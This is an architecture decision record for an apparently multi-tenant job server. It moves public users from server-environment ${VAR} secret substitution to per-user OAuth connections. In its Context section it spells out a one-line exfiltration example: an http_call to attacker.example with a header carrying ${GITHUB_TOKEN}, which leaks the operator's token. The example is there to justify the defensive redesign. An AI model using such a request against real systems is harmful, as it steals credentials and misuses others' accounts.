# ADR-050: Dual credential model — public OAuth connections vs operator `${VAR}`-env

- **Status**: Accepted
- **Date**: 2026-05-20
- **Deciders**: PaynePew
- **Source**: Grilling Session #6 (grill-with-docs, 2026-05-20)
- **Related**: ADR-032 (secrets `${VAR}` convention — scoped down here), ADR-049 (multi-tenant pivot), ADR-051 (action tiering), ADR-046 (r2_upload), ADR-045 (email_send)

## Context

ADR-032 made every secret-using action read its credential from the **server
environment** via `${VAR}` substitution (e.g. `${GITHUB_TOKEN}`,
`${SLACK_WEBHOOK_URL}`), resolved from `os.environ` at execution time. That is
correct for a single operator: the env holds *the operator's own* keys.

Under the ADR-049 public pivot it becomes a critical vulnerability. Verified in
code (`app/actions/http_call.py:34-40`, `app/secrets/resolver.py`):

```python
env = dict(os.environ)
resolved_headers = resolve(params.headers, env, whitelist)  # ${GITHUB_TOKEN} → operator's real token
response = await client.request(url=resolved_url, headers=resolved_headers, ...)
```

Any caller could create `http_call` with `url=https://attacker.example` and
`headers={"x":"${GITHUB_TOKEN}"}` → the worker substitutes the operator's real
token and sends it to an attacker — **one-line credential exfiltration**. The
same applies to `slack_post`/`email_send`/`r2_upload`: a stranger spends the
operator's accounts.

The question: how does an action obtain a downstream credential when the caller
is an untrusted public user?

Research (Session #6 web search) confirmed the industry norm: production remote
MCP servers **do not store users' raw secrets** — they delegate via OAuth and
hold scoped, expiring, revocable tokens ("Connect your account", standardised
as the MCP *URL elicitation* flow). Holding raw user secrets (the
Zapier/n8n vault model) is the fallback for OAuth-less services and demands
KMS-grade custody.

A forcing constraint: **recurring / unattended execution** ("every day 08:00
while the user sleeps") means the server *must* hold *some* usable credential —
"hold nothing" (local stdio) is off the table for the core feature. The only
freedom is *which kind*.

## Decision

**Two parallel, non-overlapping credential tracks.**

| Caller | Mechanism | What is stored | Blast radius |
|---|---|---|---|
| **Public (delegated) user** | per-user **OAuth connection** to the downstream service (GitHub / Slack / Google) | scoped access + refresh token, encrypted at rest via **AWS KMS envelope encryption** (ADR-054), per `user_id` | low — scoped, expiring, user-revocable, never typed |
| **Operator (you)** | `${VAR}` env substitution (**ADR-032 unchanged**) | nothing new — keys live in the VPS `.env` (0600), operator's own only | only the operator's own keys |

- The system **never stores a public user's raw long-lived secret.** No
  per-user vault of pasted API keys / SMTP passwords / webhooks.
- At execution time, an OAuth-backed action resolves *this job's `user_id`* →
  that user's connection token (auto-refreshed), bound to the specific
  downstream resource server (confused-deputy-safe: the MCP login token is
  never passed through to the downstream API).
- ADR-032's `${VAR}`-from-env path is **retained, scoped to operator-only
  actions** (ADR-051). It is not deleted — it is demoted.

## Alternatives considered

- **Per-user encrypted secret vault (M2 / BYO-key, the Zapier model).**
  Rejected as the *primary* model: on a $5 single Lightsail VPS with no KMS,
  the master key necessarily co-locates with the ciphertext, so host compromise
  = total secret loss. The deciders explicitly want "very high" secret-safety
  guarantees; this infra is a weak custodian for raw secrets. May return as a
  narrow, eyes-open fallback only if an OAuth-less public service is ever
  genuinely required.
- **Keep `${VAR}`-from-env for everyone (status quo).** Rejected — the
  exfiltration vulnerability above.
- **Pass the MCP client's OAuth token through to downstream APIs.** Rejected —
  confused-deputy attack; spec guidance is to mint a separate scoped token per
  downstream resource server.

## Consequences

- Job `action_params` for public actions reference a **connection id**
  (e.g. `connection:"github"`), not a `${VAR}` — so audit logs / `JobRun` rows
  contain no credential reference by construction, and the `http_call`
  exfiltration vector disappears from the public surface.
- The OAuth-connection store, token refresh, and encryption-at-rest key
  management are new build surface (follow-up ADRs).
- `${VAR}` + `resolver.py` + the literal-secret guardrail (ADR-032) remain in
  place verbatim for operator-only actions; no code is removed, only gated.
- Implies action tiering — which actions are public (OAuth) vs operator-only
  (`${VAR}`) — resolved in **ADR-051**.
